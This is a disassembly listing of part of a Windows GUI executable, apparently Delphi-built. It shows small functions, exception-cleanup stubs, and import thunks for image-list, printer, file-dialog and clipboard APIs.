call [ ecx + 0x10 ]
pop ebx
retn
sub_424220
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_41e4dc
retn
mov [ eax + 0x30 ] edx
retn
sub_424238
retn
sub_42423c
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_41e4dc
retn
mov [ eax + 0x2c ] edx
retn
sub_42427c
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_41e4dc
pop ebp
retn 0x4
sub_424290
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_41e4dc
pop ebp
retn 0x4
sub_4242e5
jmp sub_403a98
sub_4242ec
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4244a0
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_4244ac
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_424559
jmp sub_403a98
sub_424560
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42464b
jmp sub_4037e4
sub_4246b7
jmp sub_403a98
sub_4247e5
jmp sub_403a98
sub_4247ec
pop ebp
retn
sub_424921
jmp sub_403a98
sub_424928
pop ebp
retn
sub_42492c
sub [ rw-data ] 0x1
retn
sub_424ad0
call sub_414210
retn
sub_424b58
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4145cc
pop esi
pop ebx
retn
sub_424b80
call sub_414418
retn
sub_424bbc
call sub_414500
retn
sub_424cb4
call sub_424ad0
retn
sub_424cec
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_424b58
pop esi
pop ebx
retn
sub_424d00
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_424b6c
pop esi
pop ebx
retn
sub_424d14
mov edx ecx
call sub_424cec
retn
sub_424d1c
call sub_424b80
retn
sub_424d8c
call sub_424bbc
retn
sub_424e20
mov edx [ eax + 0x4 ]
mov ecx [ edx + 0x8 ]
dec ecx
mov eax edx
mov edx ecx
call sub_4143bc
retn
sub_424e54
mov eax [ eax + 0x4 ]
call sub_414210
retn
sub_424e85
jmp sub_403a98
sub_424e8c
pop ebp
retn
sub_424e90
sub [ rw-data ] 0x1
retn
ImageList_Create
jmp [ __import_lookup_table_12(comctl32:ImageList_Create) ]
ImageList_Destroy
jmp [ __import_lookup_table_12(comctl32:ImageList_Destroy) ]
ImageList_GetImageCount
jmp [ __import_lookup_table_12(comctl32:ImageList_GetImageCount) ]
ImageList_ReplaceIcon
jmp [ ImageList_ReplaceIcon@IAT ]
ImageList_SetBkColor
jmp [ ImageList_SetBkColor@IAT ]
ImageList_GetBkColor
jmp [ ImageList_GetBkColor@IAT ]
ImageList_Replace
jmp [ ImageList_Replace@IAT ]
ImageList_Remove
jmp [ __import_lookup_table_12(comctl32:ImageList_Remove) ]
ImageList_BeginDrag
jmp [ __import_lookup_table_12(comctl32:ImageList_BeginDrag) ]
ImageList_EndDrag
jmp [ __import_lookup_table_12(comctl32:ImageList_EndDrag) ]
ImageList_DragEnter
jmp [ __import_lookup_table_12(comctl32:ImageList_DragEnter) ]
ImageList_DragLeave
jmp [ __import_lookup_table_12(comctl32:ImageList_DragLeave) ]
ImageList_DragMove
jmp [ __import_lookup_table_12(comctl32:ImageList_DragMove) ]
ImageList_DragShowNolock
jmp [ ImageList_DragShowNolock@IAT ]
ImageList_GetDragImage
jmp [ ImageList_GetDragImage@IAT ]
ImageList_Read
jmp [ ImageList_Read@IAT ]
ImageList_Write
jmp [ ImageList_Write@IAT ]
ImageList_GetIconSize
jmp [ ImageList_GetIconSize@IAT ]
ImageList_SetIconSize
jmp [ ImageList_SetIconSize@IAT ]
sub_424f81
jmp sub_403a98
sub_424f88
pop ebp
retn
sub_424f8c
sub [ rw-data ] 0x1
retn
sub_425053
jmp sub_403a98
sub_42505a
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_425670
push r-xdata
call GetModuleHandleA
mov [ rw-data ] eax
mov [ rw-data ] sub_42507c
mov [ rw-data ] sub_425194
mov [ rw-data ] sub_425104
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] sub_425398
mov [ rw-data ] sub_42546c
mov [ rw-data ] sub_425540
retn
sub_425701
jmp sub_403a98
sub_425708
pop ebp
retn
sub_42570c
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_425670
sub_425741
jmp sub_403a98
sub_425748
pop ebp
retn
sub_42574c
sub [ rw-data ] 0x1
retn
sub_4259db
add eax 0xffffffd4
jmp sub_426508
sub_4259e3
add eax 0xffffffd4
jmp sub_426564
sub_4259f5
add [ esp + 0x4 ] 0xffffffd4
jmp sub_4058b4
sub_4259ff
add [ esp + 0x4 ] 0xffffffd4
jmp sub_4058c8
sub_425b8e
jmp sub_403a98
sub_425b95
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_425da5
jmp sub_403a98
sub_425dac
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_425f61
jmp sub_403a98
sub_425fc6
jmp sub_403a98
sub_425fcd
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4260b9
jmp sub_403a98
sub_4260c0
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4262d0
lea eax [ ebp - 0x30 ]
call sub_404094
lea eax [ ebp - 0x20 ]
call sub_404094
retn
sub_4262e1
jmp sub_403a98
j_sub_4262d0
jmp sub_4262d0
sub_4262e8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4263e3
jmp sub_403a98
sub_4263ea
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4264e7
jmp sub_403a98
sub_4264ee
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42654e
lea eax [ ebp - 0x4 ]
call sub_4057e0
retn
sub_426557
jmp sub_403a98
j_sub_42654e
jmp sub_42654e
sub_42655e
pop ebx
pop ecx
pop ebp
retn
sub_4265f9
jmp sub_403a98
sub_426600
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_42660c
mov eax [ eax + 0x20 ]
retn
sub_42673b
jmp sub_403a98
sub_426742
pop ebp
retn
sub_426744
sub [ rw-data ] 0x1
retn
ClosePrinter
jmp [ __import_lookup_table_13(winspool:ClosePrinter) ]
OpenPrinterA
jmp [ OpenPrinterA@IAT ]
sub_426791
jmp sub_403a98
sub_426798
pop ebp
retn
sub_42679c
sub [ rw-data ] 0x1
retn
sub_426a4b
jmp sub_403a98
sub_426a52
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_426c32
jmp sub_403a98
sub_426c39
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_426ca5
jmp sub_403a98
sub_426cac
pop ecx
pop ecx
pop ebp
retn
sub_426fc3
jmp sub_403a98
sub_426fca
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_426fd4
push ebx
mov ebx eax
cmp [ ebx + 0x14 ] 0xffffffff
jne r-xdata
mov eax [ ebx + 0x14 ]
pop ebx
retn
mov eax ebx
call sub_42722c
sub_4271c7
jmp sub_403a98
sub_4271d8
jmp sub_4037e4
sub_42721b
jmp sub_403a98
sub_427222
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4273c9
jmp sub_403a98
sub_427409
jmp sub_403a98
sub_427410
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_427468
add eax 0x8
call sub_40d6a0
retn
sub_427474
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_426a5c
mov [ rw-data ] eax
sub_4274c5
jmp sub_403a98
sub_4274cc
pop ebp
retn
sub_4274d0
sub [ rw-data ] 0x1
retn
sub_4277dd
jmp sub_403a98
sub_4277e4
pop ebp
retn
sub_4277e8
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_427534
sub_4278c8
retn
sub_42793c
add eax 0x4
push eax
call EnterCriticalSection
retn
sub_427948
add eax 0x4
push eax
call LeaveCriticalSection
retn
sub_427954
mov edx [ eax ]
call [ edx ]
retn
sub_42795c
mov edx [ eax ]
call [ edx + 0x4 ]
retn
sub_427989
jmp sub_403a98
sub_427990
pop ebp
retn
sub_427994
sub [ rw-data ] 0x1
retn
sub_427b53
jmp sub_403a98
sub_427b5a
pop ebp
retn
sub_427f0f
jmp sub_403a98
sub_427f16
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_428330
jmp sub_403a98
sub_428337
pop ebp
retn
sub_42833c
sub [ rw-data ] 0x1
jae r-xdata
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4278cc
mov [ rw-data ] eax
sub_42837d
jmp sub_403a98
sub_428384
pop ebp
retn
sub_428388
sub [ rw-data ] 0x1
retn
sub_4283b5
jmp sub_403a98
sub_4283bc
pop ebp
retn
sub_4283c0
sub [ rw-data ] 0x1
retn
sub_4283ed
jmp sub_403a98
sub_4283f4
pop ebp
retn
sub_4283f8
sub [ rw-data ] 0x1
retn
sub_428425
jmp sub_403a98
sub_42842c
pop ebp
retn
sub_428430
sub [ rw-data ] 0x1
retn
sub_42845d
jmp sub_403a98
sub_428464
pop ebp
retn
sub_428468
sub [ rw-data ] 0x1
retn
sub_428495
jmp sub_403a98
sub_42849c
pop ebp
retn
sub_4284a0
sub [ rw-data ] 0x1
retn
sub_428501
jmp sub_403a98
sub_428508
pop ebp
retn
sub_42850c
sub [ rw-data ] 0x1
retn
GetOpenFileNameA
jmp [ GetOpenFileNameA@IAT ]
GetSaveFileNameA
jmp [ GetSaveFileNameA@IAT ]
FindTextA
jmp [ FindTextA@IAT ]
ReplaceTextA
jmp [ ReplaceTextA@IAT ]
sub_428561
jmp sub_403a98
sub_428568
pop ebp
retn
sub_42856c
sub [ rw-data ] 0x1
retn
sub_428599
jmp sub_403a98
sub_4285a0
pop ebp
retn
sub_4285a4
sub [ rw-data ] 0x1
retn
sub_428a48
jmp r-xdata
sub_428a4a
0xc4ffe9ff 0x429c
sub_4298fe
jmp sub_4037e4
sub_429903
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_46321c
call sub_403b4c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_429920
mov ecx [ eax ]
call [ ecx - 0x14 ]
retn
sub_429928
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
mov si 0xffef
call sub_403540
pop esi
retn
sub_429940
push ebx
push esi
mov ebx edx
mov si 0xffee
call sub_403540
xor eax eax
mov [ ebx + 0xc ] eax
pop esi
pop ebx
retn
sub_429958
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x3c ] eax
pop esi
retn
sub_429a01
jmp sub_403a98
sub_429a2f
jmp sub_403a98
sub_429a36
mov eax [ ebp - 0xc ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_429a40
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_429a54
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_429cec
push ebx
cmp [ eax + 0x8a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
sub_429d0c
push ebx
cmp [ eax + 0x92 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
sub_429d2c
push ebx
cmp [ eax + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x9c ]
call [ ebx + 0x98 ]
sub_429d7e
jmp sub_403a98
sub_429d85
pop ecx
pop ebp
retn
sub_42a0cd
jmp sub_403a98
sub_42a0d4
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42a20d
jmp sub_403a98
sub_42a214
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42a2d3
jmp sub_403a98
sub_42a2da
pop ebx
mov esp ebp
pop ebp
retn
sub_42a38c
cmp [ eax + 0x3c ] 0x0
je r-xdata
mov eax [ eax + 0x64 ]
retn
mov eax [ eax + 0x68 ]
retn
sub_42a3f4
push ebx
mov ebx eax
mov edx GetOpenFileNameA
mov eax ebx
call sub_429e1c
cmp eax 0x1
sbb eax eax
inc eax
pop ebx
retn
sub_42a40c
push ebx
cmp [ eax + 0xaa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0xac ]
call [ ebx + 0xa8 ]
sub_42a428
push ebx
mov ebx eax
mov edx GetSaveFileNameA
mov eax ebx
call sub_429e1c
cmp eax 0x1
sbb eax eax
inc eax
pop ebx
retn
sub_42a534
jmp sub_403a98
sub_42a5b0
jmp sub_403a98
sub_42a5b7
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42a642
jmp sub_403a98
sub_42a6bf
jmp sub_403a98
sub_42a6c6
pop ecx
pop ebp
retn 0x8
sub_42aab8
jmp sub_4037e4
sub_42ade0
call sub_403344
retn
sub_42b168
push ebx
cmp [ eax + 0x72 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x74 ]
call [ ebx + 0x70 ]
sub_42b17c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
lea edx [ ebx + 0xac ]
mov ecx 0x100
call sub_404304
pop esi
pop ebx
retn
sub_42b198
push ebx
add esp 0xfffffff8
mov ebx eax
mov edx esp
mov eax ebx
call sub_42b1b0
mov eax [ esp ]
pop ecx
pop edx
pop ebx
retn
sub_42b1e4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
lea edx [ ebx + 0x1ac ]
mov ecx 0x100
call sub_404304
pop esi
pop ebx
retn
sub_42b200
push ebx
add esp 0xfffffff8
mov ebx eax
mov edx esp
mov eax ebx
call sub_42b1b0
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebx
retn
sub_42b2fa
add [ eax ] al
push ebx
cmp [ eax + 0x7a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x7c ]
call [ ebx + 0x78 ]
sub_42b5e2
jmp sub_403a98
sub_42b5e9
pop ebp
retn
sub_42c6bf
[ edx ]
sub_42e138
xor edx edx
mov ecx [ eax + 0x168 ]
mov ecx [ ecx + 0xc ]
test ecx ecx
je r-xdata
mov eax edx
retn
mov eax ecx
mov edx [ eax ]
call [ edx + 0x24 ]
mov edx eax
sub_42e331
jmp sub_403a98
sub_42e338
pop ebx
mov esp ebp
pop ebp
retn
sub_42e444
cmp dl [ eax + 0x179 ]
je r-xdata
retn
mov [ eax + 0x179 ] dl
mov edx eax
call sub_42e4b4
sub_42e45c
push esi
mov esi eax
mov eax [ esi + 0x168 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_42e46c
cmp dl [ eax + 0x178 ]
je r-xdata
retn
mov [ eax + 0x178 ] dl
mov edx eax
call sub_42e4b4
sub_42e484
cmp dl [ eax + 0x17b ]
je r-xdata
retn
mov [ eax + 0x17b ] dl
mov edx eax
call sub_42e4b4
sub_42e49c
cmp dl [ eax + 0x17d ]
je r-xdata
retn
mov [ eax + 0x17d ] dl
mov edx eax
call sub_42e4b4
sub_42e6b0
push esi
mov esi eax
cmp dl [ esi + 0x168 ]
je r-xdata
pop esi
retn
mov [ esi + 0x168 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42e6cc
push esi
mov esi eax
cmp dl [ esi + 0x169 ]
je r-xdata
pop esi
retn
mov [ esi + 0x169 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42eb62
jmp sub_4037e4
sub_42ec1b
jmp sub_403a98
sub_42ec22
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42ec28
cmp dl [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] dl
call sub_42eb9c
sub_42ec38
cmp edx [ eax + 0x30 ]
je r-xdata
retn
mov [ eax + 0x30 ] edx
call sub_42eb9c
sub_42ec48
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0x38 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x3c ] edx
call sub_42eb9c
pop ebp
retn 0x8
sub_42ec60
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_42ed8c
push ebx
mov ebx eax
mov eax ebx
call sub_44835c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_42eda0
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_42edd4
cmp [ eax + 0x21e ] 0x0
jne r-xdata
retn
mov [ edx + 0xc ] 0x1
sub_42eed8
jmp sub_403a98
sub_42eedf
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42f082
jmp sub_403a98
sub_42f089
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42f093
inc [ ecx ]
add [ eax ] al
add [ edi ] dl
add [ eax ] al
mov [ eax + 0x220 ] dl
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_42f0a8
push ebx
mov ebx eax
mov [ ebx + 0x211 ] dl
mov eax ebx
call sub_445644
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_42f0e0
push ebx
mov ebx eax
mov [ ebx + 0x214 ] edx
mov eax ebx
call sub_445644
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_42f0fc
push ebx
mov ebx eax
mov [ ebx + 0x218 ] edx
mov eax ebx
call sub_445644
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_42f118
cmp dl [ eax + 0x21c ]
je r-xdata
retn
mov [ eax + 0x21c ] dl
call sub_446324
sub_42f12c
mov al [ eax + 0x220 ]
retn
sub_42f295
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x0
retn
sub_42f2ad
jmp sub_403a98
sub_42f5b9
jmp sub_4037e4
sub_42f72c
retn
sub_42f8b9
jmp sub_403a98
sub_42f93c
push ebx
mov ebx eax
mov eax ebx
call sub_444658
mov eax ebx
call sub_42f730
pop ebx
retn
sub_42f950
push ebx
mov ebx eax
mov [ ebx + 0x220 ] 0x1
mov eax ebx
call sub_444d78
mov [ ebx + 0x220 ] 0x0
mov eax ebx
call sub_42fa78
pop ebx
retn
sub_42fa68
push esi
mov esi eax
mov eax [ esi + 0x214 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_42fb41
jmp sub_403a98
sub_42fb48
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42fb90
push ebx
mov ebx eax
mov eax ebx
call sub_4482e0
mov eax ebx
call sub_42f730
pop ebx
retn
sub_42fba4
push ebx
mov ebx eax
mov eax ebx
call sub_43a148
mov eax ebx
call sub_42f730
pop ebx
retn
sub_42fbb8
mov al 0x1
retn
sub_42fbbc
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_42fc6c
mov ecx [ edx ]
sub [ eax ] ecx
mov ecx [ edx + 0x4 ]
sub [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
add [ eax + 0x8 ] ecx
mov edx [ edx + 0xc ]
add [ eax + 0xc ] edx
retn
sub_42fdc8
push ebx
mov ebx edx
mov edx ebx
call sub_445c10
and [ ebx + 0x24 ] 0xfffffffc
pop ebx
retn
sub_430945
jmp sub_403a98
sub_430d61
jmp sub_403a98
sub_430d68
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_430d74
cmp edx [ eax + 0x230 ]
je r-xdata
retn
mov [ eax + 0x230 ] edx
sub_430d84
cmp dl [ eax + 0x234 ]
je r-xdata
retn
mov [ eax + 0x234 ] dl
sub_430d94
retn
sub_43167c
call sub_43168c
test eax eax
je r-xdata
xor eax eax
retn
mov eax [ eax ]
retn
sub_4317cb
jmp sub_403a98
sub_431c8c
push ebx
cmp [ eax + 0x24a ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x24c ]
call [ ebx + 0x248 ]
sub_431cdc
xor edx edx
mov ecx [ eax + 0x22c ]
mov ecx [ ecx + 0xc ]
test ecx ecx
je r-xdata
mov eax edx
retn
mov eax ecx
mov edx [ eax ]
call [ edx + 0x24 ]
mov edx eax
sub_431cf8
push esi
mov esi eax
mov eax [ esi + 0x22c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_431f8d
jmp sub_403a98
sub_431fc5
jmp sub_403a98
sub_432354
jmp sub_403a98
sub_43235b
pop ebp
retn
sub_432360
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_403e1c
mov eax [ r-xdata ]
call sub_413ba8
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_413bf4
sub_4323b5
jmp sub_403a98
sub_4323bc
pop ebp
retn
sub_4323c0
sub [ rw-data ] 0x1
retn
sub_432498
jmp sub_403a98
sub_43249f
pop ecx
pop ebp
retn
sub_4324a4
push ebx
mov ebx eax
cmp [ ebx + 0x4 ] 0x0
je r-xdata
pop ebx
retn
cmp [ ebx + 0xd ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov [ ebx + 0xd ] 0x1
sub_4325da
jmp sub_403a98
sub_4325e1
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43268a
jmp sub_403a98
sub_4326f0
jmp sub_403a98
sub_4326f7
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_432755
jmp sub_403a98
sub_43275c
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_432841
jmp sub_403a98
sub_432848
pop ebx
mov esp ebp
pop ebp
retn
sub_4328c5
jmp sub_403a98
sub_4328cc
pop ebx
mov esp ebp
pop ebp
retn
sub_43296a
jmp sub_4037e4
sub_432a01
jmp sub_403a98
sub_432a08
pop ebp
retn
sub_432a0c
sub [ rw-data ] 0x1
jae r-xdata
retn
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] ax
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] ax
xor eax eax
mov [ rw-data ] eax
sub_432a88
retn
sub_432a89
jmp sub_403a98
j_sub_432a88
jmp sub_432a88
sub_432a90
pop ebp
retn
sub_432a94
sub [ rw-data ] 0x1
retn
sub_432cf0
jmp r-xdata
sub_4334dc
mov eax [ eax + 0x4 ]
cmp [ eax + 0x8 ] 0x0
sete al
retn
sub_433c5f
jmp sub_403a98
sub_433c9b
jmp sub_403a98
sub_4348a6
jmp sub_403a98
sub_4348ad
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_434b34
call sub_443ad8
retn
sub_434b3c
push ebx
mov ebx eax
mov eax ebx
call sub_434b58
mov edx [ eax ]
call [ edx + 0x24 ]
pop ebx
retn
sub_434b50
mov eax [ r-xdata ]
retn
sub_434b58
mov eax [ eax + 0x16c ]
mov eax [ eax + 0x4 ]
retn
sub_434b64
push esi
mov esi eax
mov eax [ esi + 0x16c ]
call sub_43364c
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
pop esi
retn
sub_434b7c
mov eax [ eax + 0x16c ]
mov al [ eax + 0x20 ]
retn
sub_434bb4
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_434c64
push esi
mov esi eax
cmp dl [ esi + 0x180 ]
je r-xdata
pop esi
retn
mov [ esi + 0x180 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_434c80
cmp edx [ eax + 0x168 ]
je r-xdata
retn
mov [ eax + 0x168 ] edx
call sub_434bbc
sub_434c94
push esi
mov esi eax
cmp dl [ esi + 0x173 ]
je r-xdata
pop esi
retn
mov [ esi + 0x173 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_434cb0
push esi
mov esi eax
cmp edx [ esi + 0x17c ]
je r-xdata
pop esi
retn
cmp edx 0xffffffff
jl r-xdata
mov [ esi + 0x17c ] edx
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_434cd0
push esi
mov esi eax
cmp edx [ esi + 0x174 ]
je r-xdata
pop esi
retn
mov [ esi + 0x174 ] edx
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_434d28
cmp dl [ eax + 0x172 ]
je r-xdata
retn
mov [ eax + 0x172 ] dl
call sub_434bbc
sub_434d3c
push esi
mov esi eax
mov eax esi
call sub_443c88
cmp [ esi + 0x170 ] 0x0
je r-xdata
pop esi
retn
mov eax esi
mov si 0xffe9
call sub_403540
sub_434e89
jmp sub_403a98
sub_434e90
pop edi
pop esi
pop ecx
pop ebp
retn
sub_434e98
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_434ea0
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_434ea8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x16c ]
mov eax esi
call sub_4335d8
mov dl [ ebx + 0x182 ]
mov eax esi
call sub_4336ec
pop esi
pop ebx
retn
sub_4350d8
push ebx
push esi
mov bl 0xb
mov esi rw-data
mov eax [ esi ]
call sub_403344
add esi 0x4
dec bl
jne r-xdata
pop esi
pop ebx
retn
sub_43519c
jmp sub_403a98
sub_4351a3
pop ebp
retn
sub_4351a8
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_4350f4
call sub_403e68
mov eax rw-data
xor ecx ecx
mov edx 0x2c
call sub_402d44
sub_435563
jmp sub_4037e4
sub_43559b
jmp sub_403a98
sub_4355a2
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_435861
jmp sub_403a98
sub_435910
push ebx
mov ebx eax
mov eax ebx
call sub_404554
push eax
call GetFileAttributesA
cmp eax 0xffffffff
setne al
pop ebx
retn
sub_435a64
jmp sub_4037e4
sub_435b00
jmp sub_403a98
sub_435b07
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_435b10
call sub_429a40
mov eax [ rw-data ]
mov eax [ eax ]
call sub_463d6c
retn
sub_435bfc
jmp sub_403a98
sub_435c03
pop ebx
mov esp ebp
pop ebp
retn
sub_435c08
mov edx [ rw-data ]
cmp [ edx ] 0x0
je r-xdata
xor edx edx
mov [ eax + 0x44 ] edx
test [ eax + 0x5e ] 0x1
jne r-xdata
mov edx r-xdata
mov [ eax + 0x44 ] edx
jmp r-xdata
call sub_42a3f4
retn
sub_435e86
jmp sub_403a98
sub_435e8d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435eaa
lea eax [ ebp - 0x8 ]
call sub_404094
retn
sub_435ea3
jmp sub_403a98
sub_435eaa
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_435ee6
add [ eax ] al
cmp [ ecx ] 0x1b
jne r-xdata
retn
mov eax edx
call sub_45f9f4
sub_435f87
jmp sub_403a98
sub_435f8e
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_435fb9
jmp sub_403a98
sub_435fc0
pop ebp
retn
sub_435fc4
sub [ rw-data ] 0x1
retn
sub_436020
jmp sub_403a98
sub_436027
pop ebp
retn
sub_43602c
sub [ rw-data ] 0x1
retn
sub_436088
jmp sub_403a98
sub_43608f
pop ebp
retn
sub_436094
sub [ rw-data ] 0x1
retn
sub_4360f5
jmp sub_403a98
sub_4360fc
pop ebp
retn
sub_436100
sub [ rw-data ] 0x1
retn
sub_43614c
jmp sub_403a98
sub_436153
pop ebp
retn
sub_436158
sub [ rw-data ] 0x1
retn
sub_436185
jmp sub_403a98
sub_43618c
pop ebp
retn
sub_436190
sub [ rw-data ] 0x1
retn
sub_436238
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov eax r-xdata
call sub_40c50c
mov [ rw-data ] eax
sub_43626d
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
pop ebx
pop ebp
retn 0x4
sub_436284
push ebp
mov ebp esp
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop ebx
pop ebp
retn 0x4
sub_436307
jmp sub_403a98
sub_43630e
pop ebp
retn
sub_436310
sub [ rw-data ] 0x1
retn
sub_43637f
jmp [ edi ]
sub_436620
cmp [ eax + 0x5 ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x6 ] 0x0
je r-xdata
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_436638
push ebx
cmp [ eax + 0x6a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x6c ]
call [ ebx + 0x68 ]
